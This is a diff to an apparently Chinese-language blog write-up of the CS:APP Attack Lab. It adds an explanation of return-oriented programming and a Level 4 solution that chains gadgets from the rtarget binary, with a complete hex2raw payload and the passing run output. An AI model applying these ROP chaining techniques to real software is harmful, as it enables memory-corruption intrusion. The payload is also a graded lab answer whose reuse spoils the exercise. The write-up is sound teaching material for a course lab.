@@ -277,7 +277,7 @@ Valid solution for level 2 with target ctarget
 PASS: Would have posted the following:
 ```
 
-### 0x1.3 Level 3
+#### 0x1.3 Level 3
 
 `sval` 就是需要我们传入的参数，`cookie` 是需要比较的内容，可以先找到 `touch3` 函数的地址是 `0x4018fa`，先使用 `gdb`在 `touch3` 的入口打上断点，然后按照 level1 的做法，让程序在 `return` 之后跳转到 `touch3`，接着单步运行，到执行 `hexmatch` 函数之前，这个时候可以通过下面的方式访问需要的字符串以及他们对应的 16 进制数字
 
@@ -336,7 +336,88 @@ c3
 
 ### 0x2 Return-Oriented Programming
 
+有的时候采用 `code-injection` 攻击会变得非常困难，因为有两个技术可以用来防止这种攻击：
+
+- 使用 randomization 的方式，每一次 stack position 都会不一样，所以没有办法确定插入的代码在计算机中的地址，也就无法让程序运行插入的代码。
+
+- 标记 stack 所在的内存为不可执行的状态，在这个情况下，即使插入了攻击的代码，在运行它的时候也会遇到 segmentation fault。
+
+那么是不是在这种情况下我们就无法对程序进行攻击了呢？
+
+聪明的程序员发现可以通过执行代码中存在的片段而不是插入代码来实现攻击，最通用的方式叫做 *return-oriented programming*(ROP)，这种策略通过识别存在于程序中 `ret` 字节序列中的一个或多个指令，这些片段叫做 *gadget*.
+
+<div align='center'>
+<img src='{{ site.baseurl }}/images/csapp-attack/gadget.png' width='500'>
+</div>
+
+上面的图举例说明了一个 stack 是如何执行一系列的 gadgets，图中的 stack 包含了一系列 gadget 地址，每个 gadget 包含了一系列指令的字节，不过字节的最后是 `0xc3`，这个字节表示 `ret`，每次执行完一条指令之后，就可以跳到上一条指令继续执行，这样就可以形成一个序列的执行指令。
+
+例如，下面的 C 函数可以对应生成的会变代码如下
+
+```c
+void setval_210(unsinged *p) {
+    *p = 3347663060U;
+}
+```
+
+```js
+0000000000400f15 <setval_210>:
+400f15: c7 07 d4 48 89 c7  movl  $0xc78948d4,(%rdi)
+400f1b: c3                 retq
+```
+
+字节序列 `48 89 c7` 可以编码一个指令 `movq %rax, %rdi`，同时这个序列最后包含 `c3`，即 `ret` 指令。同时这个函数的开始地址是 `0x400f15`，序列从第四个字节开始，所以这就是一个 gadget，可以达到的效果是将寄存器 `%rax` 的值放到寄存器 `%rdi` 中。
+
 #### 0x2.1 Level 4
+
+在 level4 中，只需要重复 level2 的过程，但是 level2 是通过 code-injection 进行攻击的，level4 采用 gadget 的方式，可以通过 `gdb` 发现每次运行 `$rsp` 在不同，所以不能准确地定位到插入代码的位置。
+
+`rtarget.s` 中提供了一系列的可执行序列，可以在里面选择需要执行的 gadget 序列。
+
+对于 level2 而言，可以构造下面的汇编代码达到目的，因为 `pop %rax` 可以先将 `$rsp` 的内容写到 `$rax` 中，然后再将其赋值到 `$rdi` 中就实现了我们需要的结果。
+
+```js
+pop %rax; 58
+movq %rax, %rdi; 48 89 c7 
+retq; c3
+```
+
+在 `rtarget.s` 中可以找到下面两个函数，其中正好有我们需要的指令序列，第一个指令的开始位置为 `4019cc`，执行的序列为 `58 90 c3`，其中 `0x90` 表示 `nop` 指令，所以这对应于 `pop %rax` + `retq`。
+
+而 `4019a2` 则为 `48 89 c7 c3`，这就对应 `movq %rax, %rdi` + `retq`。
+
+```js
+00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+```
+
+所以最后写入的 txt 文本为 
+
+```js
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00 # 执行 pop %rax 指令 + retq
+fa 97 b9 59 00 00 00 00 # cookie 的值 0x59b997fa
+a2 19 40 00 00 00 00 00 # 执行 movq %rax, %rdi + retq
+ec 17 40 00 00 00 00 00 # 执行 touch2
+```
+
+```shell
+./hex2raw -i rtarget.2.txt | ./rtarget -q
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+```
 
 #### 0x2.2 Level 5
 
